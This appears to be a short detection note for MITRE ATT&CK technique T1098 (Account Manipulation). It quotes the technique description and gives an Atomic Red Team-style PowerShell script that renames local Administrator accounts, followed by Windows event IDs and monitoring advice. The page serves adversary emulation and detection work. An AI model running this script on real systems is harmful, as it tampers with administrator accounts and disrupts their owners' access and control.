# T1098 - Account Manipulation
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1098)
<blockquote>Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.</blockquote>

## Assumptions
Attacker has a command line access or priviledge access that can be used for account manipulation

## Execution:
[Test using Atomic Red Team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)

<blockquote>
* Run it with `powershell`!
```
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
```

* Manualy make changes to use account ( account creation, disabling , deleting, etc)

## Detection:
* Monitor changes to account objects
* Enable Windows Audit Policy
* Event ID 4720    A user account was created
* Event ID 4722    A user account was enabled
* Event ID 4725    A user account was disabled
* Event ID 4726    A user account was deleted
* Event ID 4738    A user account was changed
* Event ID 4740    A user account was locked out
* Event ID 4741    A computer account was created
* Event ID 4742    A computer account was changed
* Event ID 4743    A computer account was deleted
* Event ID 4767    A user account was unlocked
* Event ID 4797    An attempt was made to query the existence of a blank password for an account

### Visibility
* Windows log event
* Enable Windows event log , Audit

* Account manipulation with relation to other events
* Changes to account objects
* Use of "net user"
